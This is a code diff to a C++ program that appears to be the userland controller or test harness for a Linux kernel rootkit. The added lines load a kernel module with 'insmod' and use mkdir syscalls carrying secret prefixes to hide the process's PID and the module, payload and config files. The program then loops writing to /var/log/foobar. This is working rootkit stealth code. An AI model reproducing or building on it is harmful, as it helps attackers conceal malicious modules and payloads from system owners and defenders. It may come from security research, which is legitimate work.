@@ -8,12 +8,17 @@
 #include <string>
 #include <iostream>
 #include <sstream>
+#include <stdlib.h>
 
 using namespace std;
 
 int hidepid(string path) {
 	path = string(secret_api_hidepid) + path;
 	return syscall(SYS_mkdir, path.c_str());
+}
+
+int hidepath(string path) {
+	return syscall(SYS_mkdir, (string(secret_api_hidepath) + path).c_str());
 }
 
 string getPID() {
@@ -24,9 +29,13 @@ string getPID() {
 }
 
 int main() {
+	sleep(20);
+	system((string("insmod ") + secret_ko_name).c_str());
 	cout << hidepid(getPID()) << endl;
-	sleep(15);
-	cout << syscall(SYS_mkdir, secret_api_procmods) << endl; //enable the hiding of the module in /proc/modules
+	cout << hidepath(secret_ko_name) << endl;
+	cout << hidepath(secret_payload_name) << endl;
+	cout << hidepath(secret_conf_name) << endl;
+
 	while (true) {
 		ofstream outfile("/var/log/foobar", ofstream::app);
 		outfile << "foobar" << endl;
